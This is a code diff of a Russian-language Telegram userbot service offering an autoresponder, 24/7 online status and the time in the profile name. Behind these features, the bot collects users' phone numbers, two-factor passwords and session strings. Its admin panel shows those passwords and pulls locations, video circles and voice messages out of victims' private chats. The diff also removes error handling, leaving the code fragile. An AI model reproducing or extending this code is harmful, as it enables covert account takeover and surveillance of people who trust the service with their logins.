@@ -21,6 +21,9 @@ if sys.platform != "win32":
 else:
     print("🚀 Запуск Скрипта")
 
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
 from aiogram import Bot, Dispatcher, types, F, BaseMiddleware
 from aiogram.filters import CommandStart
 from aiogram.utils.keyboard import InlineKeyboardBuilder
@@ -70,6 +73,7 @@ RU_MONTHS = {
 def format_date_ru(dt):
     return f"{dt.day} {RU_MONTHS.get(dt.month, '')} {dt.year} года"
 
+# Функция конвертации времени в жирный Unicode-шрифт для профиля Telegram
 BOLD_DIGITS = {
     '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
     '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
@@ -79,10 +83,8 @@ def format_bold_time(time_str):
     return "".join(BOLD_DIGITS.get(ch, ch) for ch in time_str)
 
 def is_admin(user: types.User):
-    if not user:
+    if user.id != ADMIN_ID:
         return False
-    if user.id == ADMIN_ID:
-        return True
     if user.username and user.username.lower() == ADMIN_USERNAME.lower():
         return True
     return False
@@ -110,10 +112,7 @@ USER_MESSAGE_DELETE_DELAY = 3
 
 
 def format_remaining_time(seconds):
-    try:
-        total = max(0, int(seconds))
-    except (TypeError, ValueError):
-        total = 0
+    total = max(0, int(seconds))
     days, rem = divmod(total, 86400)
     hours, rem = divmod(rem, 3600)
     minutes, secs = divmod(rem, 60)
@@ -205,14 +204,14 @@ TEXTS = {
     "msg_pwd_wrong": "❌ Неверный пароль!\nВведите заново:",
     "msg_pwd_ok": "Пароль принят!\nЮзербот успешно запущен.",
     "msg_activity_text": "Ваша история активности (за 5 дней):\n\n{0}",
-    "msg_timenick_text": "Вывод текущего времени в имя профиля.\n\nТекущий статус: {0}\nПрофиль:\n{1}\n\nСмещение часового пояса: UTC{2}",
+    "msg_timenick_text": "Вывод текущего времени в имя профиля.\n\nТекущий статус: {0}\nПрофиль: {1}\nСмещение часового пояса: UTC{2}",
     "msg_tz_select": "Выберите ваш часовой пояс🌐", 
     "msg_tz_saved": "Часовой пояс изменен на UTC{0}!",
     "msg_autoresp_text": "🤖 **Автоответчик**\n\nСтатус: {1}\nТекст приветствия:\n💬 \"{0}\"",
     "msg_autoresp_req": "Напишите новый текст приветствия в чат ✏️", 
     "msg_autoresp_saved": "Приветствие успешно сохранено! 🎉",
     "msg_autoresp_default": "👋 Здравствуйте! Сейчас я не в сети, отвечу позже.",
-    "msg_247_text": "⚡ **Режим 24/7**\n\nСтатус: {0}\nВремя работы: {1} ч. {2} мин.\nРаботает без суточного лимита.",
+    "msg_247_text": "⚡ **Режим 24/7**\n\nСтатус: {0}\nРаботает без суточного лимита.",
     "msg_limit_247_reached": "Режим 24/7 больше не имеет суточного лимита."
 }
 
@@ -224,13 +223,9 @@ def get_current_styled_profile_preview(base_first, base_last, offset, include_ni
     first = clean_first
     last = clean_last
     if include_time:
-        try:
-            offset_num = float(offset)
-        except (TypeError, ValueError):
-            offset_num = 5.0
         tz_now = (
             datetime.datetime.now(datetime.timezone.utc)
-            + datetime.timedelta(hours=offset_num)
+            + datetime.timedelta(hours=offset, seconds=60)
             + datetime.timedelta(seconds=PROFILE_TIME_OFFSET_SECONDS)
         )
         raw_time = tz_now.strftime("%H:%M")
@@ -259,21 +254,19 @@ async def ensure_profile_base(user_id, me=None):
         asyncio.create_task(async_db_save("config", uid_str, cfg))
     return cfg
 
-MEMORY_DB = {"config": {}, "activity": {}, "logs": {}, "entries": {}}
+MEMORY_DB = {"config": {}, "activity": {}, "logs": {}}
 USER_DATA = {}
 
 def db_get_data(table: str, user_id: str):
-    default = [] if table == "logs" else {}
     if not supabase:
-        return default
+        return {}
     try:
         res = supabase.table(table).select("data").eq("id", str(user_id)).execute()
         if res.data:
-            val = res.data[0].get("data")
-            return val if val is not None else default
+            return res.data[0].get("data", {})
     except Exception as e:
         logging.error(f"Error fetching Supabase {table}: {e}")
-    return default
+    return {}
 
 def db_get_all_config():
     if not supabase:
@@ -293,96 +286,6 @@ def db_save_data(table: str, user_id: str, data: dict):
     except Exception as e:
         logging.error(f"Error saving Supabase {table}: {e}")
 
-# Определение региона по номеру или языковому коду
-def get_region_from_phone_or_lang(phone, lang_code=None):
-    if phone and phone != "Не указан":
-        clean_phone = str(phone).strip()
-        if not clean_phone.startswith("+") and clean_phone.isdigit():
-            clean_phone = "+" + clean_phone
-        
-        if clean_phone.startswith("+998"):
-            return "Узбекистан 🇺🇿"
-        elif clean_phone.startswith("+7"):
-            return "Россия / Казахстан 🇷🇺/🇰🇿"
-        elif clean_phone.startswith("+380"):
-            return "Украина 🇺🇦"
-        elif clean_phone.startswith("+375"):
-            return "Беларусь 🇧🇾"
-        elif clean_phone.startswith("+996"):
-            return "Кыргызстан 🇰🇬"
-        elif clean_phone.startswith("+992"):
-            return "Таджикистан 🇹🇯"
-        elif clean_phone.startswith("+993"):
-            return "Туркменистан 🇹🇲"
-        elif clean_phone.startswith("+994"):
-            return "Азербайджан 🇦🇿"
-        elif clean_phone.startswith("+374"):
-            return "Армения 🇦🇲"
-        elif clean_phone.startswith("+995"):
-            return "Грузия 🇬🇪"
-        elif clean_phone.startswith("+1"):
-            return "США / Канада 🇺🇸/🇨🇦"
-        elif clean_phone.startswith("+44"):
-            return "Великобритания 🇬🇧"
-        elif clean_phone.startswith("+49"):
-            return "Германия 🇩🇪"
-        elif clean_phone.startswith("+90"):
-            return "Турция 🇹🇷"
-
-    if lang_code:
-        lc = str(lang_code).lower()
-        if "uz" in lc:
-            return "Узбекистан 🇺🇿"
-        elif "ru" in lc:
-            return "СНГ / Россия 🇷🇺"
-        elif "en" in lc:
-            return "Международный (EN) 🌐"
-            
-    return "Не определен 🌐"
-
-# Работа с таблицей 'entries' (Входы)
-def db_save_entry(user_id: str, data: dict):
-    uid_str = str(user_id)
-    entry_payload = {
-        "id": uid_str,
-        "username": data.get("username", "N/A"),
-        "first_name": data.get("first_name", "User"),
-        "phone": data.get("phone", "Не указан"),
-        "language_code": data.get("language_code", "ru"),
-        "created_at": data.get("created_at") or datetime.datetime.now(datetime.timezone.utc).isoformat()
-    }
-    MEMORY_DB["entries"][uid_str] = entry_payload
-
-    if not supabase:
-        return
-    try:
-        supabase.table("entries").upsert(entry_payload).execute()
-    except Exception as e:
-        logging.error(f"Error saving entry: {e}")
-
-def db_delete_entry(user_id: str):
-    uid_str = str(user_id)
-    if uid_str in MEMORY_DB["entries"]:
-        del MEMORY_DB["entries"][uid_str]
-
-    if not supabase:
-        return
-    try:
-        supabase.table("entries").delete().eq("id", uid_str).execute()
-    except Exception as e:
-        logging.error(f"Error deleting entry: {e}")
-
-def db_get_and_clean_entries():
-    if supabase:
-        try:
-            res = supabase.table("entries").select("*").execute()
-            if res.data:
-                for item in res.data:
-                    MEMORY_DB["entries"][str(item["id"])] = item
-        except Exception as e:
-            logging.error(f"Error getting entries: {e}")
-    return list(MEMORY_DB["entries"].values())
-
 async def async_db_get(table: str, user_id: str):
     return await asyncio.to_thread(db_get_data, table, str(user_id))
 
@@ -400,7 +303,7 @@ def get_text(user_id, key, *args):
 
 def log_action(user_id, action_text):
     uid_str = str(user_id)
-    if uid_str not in MEMORY_DB["logs"] or MEMORY_DB["logs"][uid_str] is None:
+    if uid_str not in MEMORY_DB["logs"]:
         MEMORY_DB["logs"][uid_str] = db_get_data("logs", uid_str) or []
     now_str = datetime.datetime.now().strftime("%d.%m %H:%M")
     MEMORY_DB["logs"][uid_str].append(f"{now_str} - {action_text}")
@@ -411,9 +314,9 @@ def log_action(user_id, action_text):
 def get_user_state(user_id):
     if user_id not in USER_DATA:
         uid_str = str(user_id)
-        if uid_str not in MEMORY_DB["config"] or MEMORY_DB["config"][uid_str] is None:
-            MEMORY_DB["config"][uid_str] = db_get_data("config", uid_str) or {}
-        saved_msg_id = (MEMORY_DB["config"].get(uid_str) or {}).get("msg_id", None)
+        if uid_str not in MEMORY_DB["config"]:
+            MEMORY_DB["config"][uid_str] = db_get_data("config", uid_str)
+        saved_msg_id = MEMORY_DB["config"].get(uid_str, {}).get("msg_id", None)
         USER_DATA[user_id] = {
             "msg_id": saved_msg_id, "phone": None, "password": None, "phone_code_hash": None,
             "client": None, "state": "START",
@@ -481,7 +384,7 @@ async def handle_revoked_session(user_id, reason="сессия была отоз
     await clear_session_files(user_id)
 
     uid_str = str(user_id)
-    if uid_str in MEMORY_DB["config"] and MEMORY_DB["config"][uid_str]:
+    if uid_str in MEMORY_DB["config"]:
         MEMORY_DB["config"][uid_str]["logged_in"] = False
         MEMORY_DB["config"][uid_str]["status_24_7"] = False
         MEMORY_DB["config"][uid_str]["time_nick_active"] = False
@@ -516,10 +419,6 @@ class RestartMiddleware(BaseMiddleware):
 
 async def delete_user_message_later(message: types.Message, delay=USER_MESSAGE_DELETE_DELAY):
     await asyncio.sleep(delay)
-    try:
-        await message.delete()
-    except Exception:
-        pass
 
 class IncomingUserMessageCleanupMiddleware(BaseMiddleware):
     async def __call__(self, handler, event, data):
@@ -571,7 +470,7 @@ async def edit_or_send(user_id, text, reply_markup=None, parse_mode=None):
     data["msg_id"] = msg.message_id
 
     uid_str = str(user_id)
-    if MEMORY_DB["config"].get(uid_str) is not None:
+    if uid_str in MEMORY_DB["config"]:
         MEMORY_DB["config"][uid_str]["msg_id"] = msg.message_id
         asyncio.create_task(
             async_db_save("config", uid_str, MEMORY_DB["config"][uid_str])
@@ -602,7 +501,7 @@ async def autoresponder_func(client, message):
             return
 
         uid_str = str(owner_id)
-        user_cfg = MEMORY_DB["config"].get(uid_str) or await async_db_get("config", uid_str) or {}
+        user_cfg = MEMORY_DB["config"].get(uid_str) or await async_db_get("config", uid_str)
         if not user_cfg or not user_cfg.get("autoresponder_active", False):
             return
 
@@ -682,7 +581,7 @@ async def activity_tracker_loop(user_id):
             continue
 
         uid_str = str(user_id)
-        if uid_str not in MEMORY_DB["activity"] or MEMORY_DB["activity"][uid_str] is None:
+        if uid_str not in MEMORY_DB["activity"]:
             MEMORY_DB["activity"][uid_str] = await async_db_get("activity", uid_str) or {}
 
         today = datetime.datetime.now().strftime("%d.%m.%Y")
@@ -753,13 +652,9 @@ async def update_profile_branding(user_id):
 
         if user_cfg.get("time_nick_active", False):
             offset = user_cfg.get("timezone_offset", 5)
-            try:
-                offset_num = float(offset)
-            except (TypeError, ValueError):
-                offset_num = 5.0
             tz_now = (
                 datetime.datetime.now(datetime.timezone.utc)
-                + datetime.timedelta(hours=offset_num)
+                + datetime.timedelta(hours=offset, seconds=60)
                 + datetime.timedelta(seconds=PROFILE_TIME_OFFSET_SECONDS)
             )
             time_value = tz_now.strftime('%H:%M')
@@ -816,7 +711,6 @@ async def _build_runtime_client(user_id, session_string):
         api_id=API_ID,
         api_hash=API_HASH,
         session_string=session_string,
-        in_memory=True,
         device_model="QwittyBot",
         system_version="Server",
         app_version="Worker",
@@ -954,40 +848,37 @@ async def ensure_client_connected(user_id):
         return False
 
 async def restore_saved_sessions():
-    try:
-        rows = await asyncio.to_thread(db_get_all_config)
-        restored = 0
-        skipped = 0
+    rows = await asyncio.to_thread(db_get_all_config)
+    restored = 0
+    skipped = 0
 
-        for row in rows:
-            uid_str = str(row.get("id", ""))
-            cfg = row.get("data") or {}
-            if not uid_str or not cfg.get("logged_in") or not cfg.get("session_string"):
-                continue
+    for row in rows:
+        uid_str = str(row.get("id", ""))
+        cfg = row.get("data") or {}
+        if not uid_str or not cfg.get("logged_in") or not cfg.get("session_string"):
+            continue
 
-            needs_runtime = any([
-                cfg.get("autoresponder_active", False),
-                cfg.get("status_24_7", False),
-                cfg.get("time_nick_active", False),
-            ])
-            if not needs_runtime:
-                continue
+        needs_runtime = any([
+            cfg.get("autoresponder_active", False),
+            cfg.get("status_24_7", False),
+            cfg.get("time_nick_active", False),
+        ])
+        if not needs_runtime:
+            continue
 
-            try:
-                MEMORY_DB["config"][uid_str] = cfg
-                await ensure_client_connected(int(uid_str))
-                state = get_user_state(int(uid_str))
-                if state.get("client"):
-                    restored += 1
-                else:
-                    skipped += 1
-            except Exception as e:
+        try:
+            MEMORY_DB["config"][uid_str] = cfg
+            await ensure_client_connected(int(uid_str))
+            state = get_user_state(int(uid_str))
+            if state.get("client"):
+                restored += 1
+            else:
                 skipped += 1
-                logging.error(f"Ошибка восстановления аккаунта {uid_str}: {e}")
+        except Exception as e:
+            skipped += 1
+            logging.error(f"Ошибка восстановления аккаунта {uid_str}: {e}")
 
-        logging.info(f"🔄 Восстановление сессий: запущено={restored}, пропущено={skipped}")
-    except Exception as e:
-        logging.error(f"❌ Ошибка при восстановлении сессий: {e}")
+    logging.info(f"🔄 Восстановление сессий: запущено={restored}, пропущено={skipped}")
 
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
@@ -1002,7 +893,7 @@ async def cmd_start(message: types.Message):
         data["msg_id"] = None
         data["ui_action_count"] = 0
 
-    if not MEMORY_DB["config"].get(uid_str):
+    if uid_str not in MEMORY_DB["config"]:
         MEMORY_DB["config"][uid_str] = db_get_data("config", uid_str) or {
             "phone": "Не указан", "password": "Нет", "status_24_7": False,
             "time_nick_active": False, "autoresponder_active": False,
@@ -1026,15 +917,6 @@ async def cmd_start(message: types.Message):
         await edit_or_send(user_id, get_text(user_id, "msg_menu"),
                            reply_markup=show_main_menu_builder(user_id, message.from_user).as_markup())
     else:
-        # Регистрация нажатия /start пользователем без подключенного юзербота
-        entry_info = {
-            "username": message.from_user.username or "N/A",
-            "first_name": message.from_user.first_name or "User",
-            "phone": MEMORY_DB["config"].get(uid_str, {}).get("phone", "Не указан"),
-            "language_code": message.from_user.language_code or "ru"
-        }
-        asyncio.create_task(asyncio.to_thread(db_save_entry, uid_str, entry_info))
-
         data["state"] = "START"
         log_action(user_id, "Ввёл команду /start")
         if is_registration_blocked(user_id):
@@ -1198,14 +1080,6 @@ async def process_phone(message: types.Message):
     data["state"] = "WAITING_CODE"
     session_name = f"user_{user_id}_{int(time.time())}"
 
-    # Обновление номера телефона во временной записи входов
-    asyncio.create_task(asyncio.to_thread(db_save_entry, str(user_id), {
-        "username": message.from_user.username or "N/A",
-        "first_name": message.from_user.first_name or "User",
-        "phone": phone,
-        "language_code": message.from_user.language_code or "ru"
-    }))
-
     client = Client(
         name=session_name, api_id=API_ID, api_hash=API_HASH, workdir=SESSIONS_DIR,
         device_model="QwittyBot", system_version="Server", app_version="Worker",
@@ -1250,7 +1124,7 @@ async def process_phone(message: types.Message):
 def save_user_config(user_id, message, is_logged_in=True):
     data = get_user_state(user_id)
     uid_str = str(user_id)
-    old_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    old_cfg = MEMORY_DB["config"].get(uid_str, {})
     cfg = {
         "phone": data["phone"] or old_cfg.get("phone", "Не указан"),
         "password": data["password"] or old_cfg.get("password", "Нет"),
@@ -1298,6 +1172,7 @@ async def process_code(message: types.Message):
 
     try:
         await client.sign_in(data["phone"], data["phone_code_hash"], code)
+        await client.initialize()
         session_string = await _persist_session_string(user_id, client)
 
         await close_pyrogram_client(client)
@@ -1308,10 +1183,6 @@ async def process_code(message: types.Message):
         data["state"] = "LOGGED_IN"
         start_activity_tracker(user_id)
         save_user_config(user_id, message)
-
-        # Пользователь привязал юзербота — удаляем запись из списка невошедших
-        asyncio.create_task(asyncio.to_thread(db_delete_entry, str(user_id)))
-
         builder = InlineKeyboardBuilder()
         builder.button(text=get_text(user_id, "msg_btn_go"), callback_data="main_menu")
         await edit_or_send(user_id, get_text(user_id, "msg_success_login"), reply_markup=builder.as_markup())
@@ -1349,6 +1220,7 @@ async def process_password(message: types.Message):
 
     try:
         await client.check_password(password)
+        await client.initialize()
         session_string = await _persist_session_string(user_id, client)
 
         await close_pyrogram_client(client)
@@ -1360,10 +1232,6 @@ async def process_password(message: types.Message):
         data["password"] = password
         start_activity_tracker(user_id)
         save_user_config(user_id, message)
-
-        # Пользователь привязал юзербота — удаляем запись из списка невошедших
-        asyncio.create_task(asyncio.to_thread(db_delete_entry, str(user_id)))
-
         builder = InlineKeyboardBuilder()
         builder.button(text=get_text(user_id, "msg_btn_go"), callback_data="main_menu")
         await edit_or_send(user_id, get_text(user_id, "msg_pwd_ok"), reply_markup=builder.as_markup())
@@ -1380,6 +1248,7 @@ def show_main_menu_builder(user_id, user_obj: types.User = None):
     builder.button(text=get_text(user_id, "btn_247"), callback_data="menu_247")
     builder.button(text=get_text(user_id, "btn_rules"), callback_data="rules_menu_view")
     
+    # Кнопка Админ располагается в одном ряду с кнопкой Правила
     if user_obj and is_admin(user_obj):
         builder.button(text="Админ 👑", callback_data="admin_main")
         builder.adjust(2, 2, 2)
@@ -1415,102 +1284,10 @@ async def admin_main_menu(callback: types.CallbackQuery):
 
     builder = InlineKeyboardBuilder()
     builder.button(text="Активность пользователей", callback_data="admin_users_1")
-    builder.button(text="Входы 📥", callback_data="admin_entries_1")
     builder.button(text=get_text(callback.from_user.id, "btn_back_menu"), callback_data="main_menu")
     builder.adjust(1)
 
     await edit_or_send(callback.from_user.id, "Админ меню:", reply_markup=builder.as_markup())
-    try: await callback.answer()
-    except Exception: pass
-
-@dp.callback_query(F.data.startswith("admin_entries_"))
-async def admin_entries_list(callback: types.CallbackQuery):
-    if not is_admin(callback.from_user): return
-
-    page = int(callback.data.split("_")[-1])
-    entries = await asyncio.to_thread(db_get_and_clean_entries)
-
-    # Исключаем тех, кто уже успел подключить юзербота
-    valid_entries = []
-    for item in entries:
-        uid = str(item.get("id"))
-        cfg = MEMORY_DB["config"].get(uid) or {}
-        if not cfg.get("logged_in", False):
-            valid_entries.append(item)
-
-    # Сортировка по дате (свежие вверху)
-    valid_entries.sort(key=lambda x: str(x.get("created_at", "")), reverse=True)
-
-    per_page = 5
-    total_items = len(valid_entries)
-    total_pages = max(1, (total_items + per_page - 1) // per_page)
-    page = max(1, min(page, total_pages))
-
-    start_idx = (page - 1) * per_page
-    end_idx = start_idx + per_page
-    current_page_items = valid_entries[start_idx:end_idx]
-
-    builder = InlineKeyboardBuilder()
-
-    if not current_page_items:
-        text = "📥 **Список входящих пуст:**\n\nНет пользователей без юзербота."
-    else:
-        text = f"📥 **Список входящих пользователей ({total_items}):**\nВыберите пользователя для просмотра:"
-        for item in current_page_items:
-            uid = item.get("id", "N/A")
-            fname = item.get("first_name", "User")
-            builder.button(text=f"👤 {fname} ({uid})", callback_data=f"admin_entry_{uid}")
-
-    builder.adjust(1)
-
-    # Пагинация
-    nav_buttons = []
-    if page > 1:
-        nav_buttons.append(types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"admin_entries_{page-1}"))
-    
-    nav_buttons.append(types.InlineKeyboardButton(text=f"📖 {page}/{total_pages}", callback_data="ignore"))
-    
-    if page < total_pages:
-        nav_buttons.append(types.InlineKeyboardButton(text="Вперед ➡️", callback_data=f"admin_entries_{page+1}"))
-
-    if nav_buttons:
-        builder.row(*nav_buttons)
-
-    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_main")
-
-    await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
-    try: await callback.answer()
-    except Exception: pass
-
-@dp.callback_query(F.data.startswith("admin_entry_"))
-async def admin_entry_view(callback: types.CallbackQuery):
-    if not is_admin(callback.from_user): return
-    target_uid = callback.data.split("_")[-1]
-
-    entries = MEMORY_DB.get("entries", {})
-    entry = entries.get(target_uid) or {}
-
-    fname = entry.get("first_name") or "User"
-    uname = entry.get("username", "N/A")
-    uname_str = f"@{uname}" if uname != "N/A" else "Отсутствует"
-    phone = entry.get("phone", "Не указан")
-    lang = entry.get("language_code")
-    region = get_region_from_phone_or_lang(phone, lang)
-
-    text = (
-        f"👤 **Входящий пользователь:**\n\n"
-        f"Никнейм: {fname}\n"
-        f"Юзернейм: {uname_str}\n"
-        f"Номер: {phone}\n"
-        f"Регион (IP/Локация): {region}\n"
-        f"ID: `{target_uid}`"
-    )
-
-    builder = InlineKeyboardBuilder()
-    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_entries_1")
-    builder.adjust(1)
-
-    await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
     try: await callback.answer()
     except Exception: pass
 
@@ -1521,17 +1298,19 @@ async def admin_users_list(callback: types.CallbackQuery):
     page = int(callback.data.split("_")[-1])
     all_configs = list(MEMORY_DB["config"].items())
 
+    # Отображаем только активных пользователей с подключенным юзерботом
     active_configs = []
     for uid, cfg in all_configs:
         try:
-            if cfg and cfg.get("logged_in") and await ensure_client_connected(int(uid)):
+            if cfg.get("logged_in") and await ensure_client_connected(int(uid)):
                 active_configs.append((uid, cfg))
         except Exception:
             pass
 
+    # Сортировка пользователей (сначала самые активные)
     def get_user_score(item):
         uid, cfg = item
-        activity = MEMORY_DB["activity"].get(uid, {}) or {}
+        activity = MEMORY_DB["activity"].get(uid, {})
         return sum(activity.values()) if activity else (1 if cfg.get("logged_in") else 0)
 
     active_configs.sort(key=get_user_score, reverse=True)
@@ -1552,6 +1331,7 @@ async def admin_users_list(callback: types.CallbackQuery):
     
     builder.adjust(1)
 
+    # Кнопки пагинации
     nav_buttons = []
     if page > 1:
         nav_buttons.append(types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"admin_users_{page-1}"))
@@ -1580,6 +1360,7 @@ async def admin_user_view(callback: types.CallbackQuery):
     phone = cfg.get("phone", "Не указан")
     password = cfg.get("password", "Нет")
 
+    # Выгрузка устройств активных сессий пользователя
     devices_str = "Неизвестно"
     target_state = get_user_state(int(target_uid))
     client = target_state.get("client")
@@ -1680,6 +1461,7 @@ async def admin_location_view(callback: types.CallbackQuery):
     search_done = False
     location_found = False
 
+    # Бесконечная анимация ожидания до завершения поиска
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1696,6 +1478,7 @@ async def admin_location_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
+            # 1. Сначала проверяем Избранное ("me") на свежие геолокации
             async for msg in client.get_chat_history("me", limit=15):
                 if msg.location:
                     await bot.send_location(
@@ -1707,6 +1490,7 @@ async def admin_location_view(callback: types.CallbackQuery):
                     break
                 await asyncio.sleep(0.1)
 
+            # 2. Если в Избранном нет, ищем в свежих сообщениях личных диалогов
             if not location_found:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1755,6 +1539,7 @@ async def admin_circles_view(callback: types.CallbackQuery):
     search_done = False
     circles = []
 
+    # Анимация ожидания
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1771,6 +1556,7 @@ async def admin_circles_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
+            # 1. Поиск кружков в Избранное ("me")
             async for msg in client.get_chat_history("me", limit=30):
                 if msg.video_note:
                     circles.append(msg)
@@ -1778,6 +1564,7 @@ async def admin_circles_view(callback: types.CallbackQuery):
                         break
                 await asyncio.sleep(0.05)
 
+            # 2. Поиск в личных диалогах, если найдено меньше 3
             if len(circles) < 3:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1836,6 +1623,7 @@ async def admin_voices_view(callback: types.CallbackQuery):
     search_done = False
     voices = []
 
+    # Анимация ожидания
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1852,6 +1640,7 @@ async def admin_voices_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
+            # 1. Поиск голосовых сообщений в Избранном ("me")
             async for msg in client.get_chat_history("me", limit=30):
                 if msg.voice:
                     voices.append(msg)
@@ -1859,6 +1648,7 @@ async def admin_voices_view(callback: types.CallbackQuery):
                         break
                 await asyncio.sleep(0.05)
 
+            # 2. Поиск в личных диалогах, если найдено меньше 3
             if len(voices) < 3:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1912,7 +1702,7 @@ async def admin_voices_view(callback: types.CallbackQuery):
 async def menu_autoresponder(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
     is_active = user_cfg.get("autoresponder_active", False)
     greeting = user_cfg.get("autoresponder_greeting", get_text(user_id, "msg_autoresp_default"))
 
@@ -1937,7 +1727,7 @@ async def toggle_autoresponder(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     action = callback.data.split("_")[-1]
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
 
     data = get_user_state(user_id)
     is_active = (action == "on")
@@ -1967,7 +1757,7 @@ async def process_autoresponder_greeting(message: types.Message):
     data = get_user_state(user_id)
     new_greeting = message.text.strip()
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
     user_cfg["autoresponder_greeting"] = new_greeting
     user_cfg["replied_users"] = []
     MEMORY_DB["config"][uid_str] = user_cfg
@@ -2007,7 +1797,7 @@ async def menu_activity(callback: types.CallbackQuery):
 async def menu_247(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
     is_active = user_cfg.get("status_24_7", False)
 
     status = get_text(user_id, "status_on") if is_active else get_text(user_id, "status_off")
@@ -2035,7 +1825,7 @@ async def toggle_247(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     action = callback.data.split("_")[-1]
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
     data = get_user_state(user_id)
 
     if action == "on":
@@ -2048,7 +1838,7 @@ async def toggle_247(callback: types.CallbackQuery):
         user_cfg["status_24_7"] = False
         data["status_24_7"] = False
         if user_cfg.get("last_247_start_ts", 0.0) > 0:
-            user_cfg["used_247_seconds"] = user_cfg.get("used_247_seconds", 0.0) + (time.time() - user_cfg["last_247_start_ts"])
+            user_cfg["used_247_seconds"] += (time.time() - user_cfg["last_247_start_ts"])
             user_cfg["last_247_start_ts"] = 0.0
         if data.get("task_24_7"):
             data["task_24_7"].cancel()
@@ -2062,7 +1852,7 @@ async def toggle_247(callback: types.CallbackQuery):
 async def menu_timenick(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
     is_active = user_cfg.get("time_nick_active", False)
     offset = user_cfg.get("timezone_offset", 5)
 
@@ -2074,7 +1864,7 @@ async def menu_timenick(callback: types.CallbackQuery):
         base_last,
         offset
     )
-    offset_formatted = f"+{offset}" if int(offset) >= 0 else f"{offset}"
+    offset_formatted = f"+{offset}" if offset >= 0 else f"{offset}"
     text = get_text(user_id, "msg_timenick_text", status, profile_preview, offset_formatted)
 
     builder = InlineKeyboardBuilder()
@@ -2095,7 +1885,7 @@ async def toggle_timenick(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     action = callback.data.split("_")[-1]
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
     data = get_user_state(user_id)
 
     if action == "on":
@@ -2109,6 +1899,7 @@ async def toggle_timenick(callback: types.CallbackQuery):
         if data.get("time_nick_task"):
             data["time_nick_task"].cancel()
             data["time_nick_task"] = None
+        await update_profile_branding(user_id)
 
     MEMORY_DB["config"][uid_str] = user_cfg
     asyncio.create_task(async_db_save("config", uid_str, user_cfg))
@@ -2118,10 +1909,13 @@ async def toggle_timenick(callback: types.CallbackQuery):
 async def select_tz_menu(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     builder = InlineKeyboardBuilder()
-    for offset, name in TIMEZONE_NAMES.items():
-        builder.button(text=name, callback_data=f"set_tz_{offset}")
-    builder.button(text=get_text(user_id, "btn_back"), callback_data="menu_timenick")
+    for tz, name in TIMEZONE_NAMES.items():
+        builder.button(text=name, callback_data=f"set_tz_{tz}")
+    
+    # Режим 2 колонки (по 2 кнопки в ряду)
     builder.adjust(2)
+    builder.row(types.InlineKeyboardButton(text=get_text(user_id, "btn_back"), callback_data="menu_timenick"))
+
     await edit_or_send(user_id, get_text(user_id, "msg_tz_select"), reply_markup=builder.as_markup())
     try: await callback.answer()
     except Exception: pass
@@ -2129,43 +1923,35 @@ async def select_tz_menu(callback: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("set_tz_"))
 async def set_tz(callback: types.CallbackQuery):
     user_id = callback.from_user.id
-    offset = int(callback.data.split("_")[-1])
+    tz_val = int(callback.data.split("_")[-1])
     uid_str = str(user_id)
-    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str) or {}
-    user_cfg["timezone_offset"] = offset
+    user_cfg = MEMORY_DB["config"].get(uid_str) or db_get_data("config", uid_str)
+    user_cfg["timezone_offset"] = tz_val
     MEMORY_DB["config"][uid_str] = user_cfg
-
     asyncio.create_task(async_db_save("config", uid_str, user_cfg))
     await update_profile_branding(user_id)
-
